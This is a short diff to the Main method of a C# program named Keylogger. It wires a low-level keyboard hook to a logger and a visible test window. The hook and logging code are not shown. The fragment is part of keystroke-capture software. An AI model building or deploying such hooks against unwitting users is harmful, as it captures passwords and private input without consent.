@@ -11,11 +11,18 @@ namespace IP
 {
     class Keylogger
     {
+        [STAThread]
         static void Main(string[] args)
         {
-            LLKeyboardHook hook = new LLKeyboardHook();
+            LoggerWriter logger = new LoggerWriter();
+            TestUI UI = new TestUI(logger);
+            LLKeyboardHook hook = new LLKeyboardHook(UI, logger);
+
             hook.Install();
-            Application.Run();
+
+            Application.EnableVisualStyles();
+            Application.Run(UI);
+
             hook.Uninstall();
 
         }
